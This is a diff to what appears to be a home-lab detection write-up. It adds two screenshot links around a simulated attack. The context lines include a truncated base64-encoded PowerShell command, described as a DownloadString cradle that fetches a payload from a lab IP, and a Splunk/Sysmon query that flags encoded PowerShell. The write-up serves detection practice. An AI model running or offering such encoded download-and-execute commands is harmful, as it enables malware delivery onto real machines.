@@ -33,6 +33,8 @@ powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwA
 
 The encoded command decodes to a `DownloadString` call pulling a payload from 192.168.56.105. The connection itself failed since the attacker server was offline during this run, but that's beside the point — Sysmon caught the full command line regardless.
 
+![PowerShell execution on Windows 10](screenshots/powershell-attack.png)
+
 ---
 
 ## Detection
@@ -48,6 +50,8 @@ index=sysmon EventCode=1 Image="*\\powershell.exe" CommandLine="*-enc*"
 ### Result
 
 Sysmon logged the command line, parent process, and user context in full. The `-enc` flag paired with `DownloadString` is a strong enough signal on its own — this combination almost never shows up in legitimate admin work.
+
+![Sysmon Event 1 in Splunk](screenshots/event-1-sysmon.png)
 
 ---
 
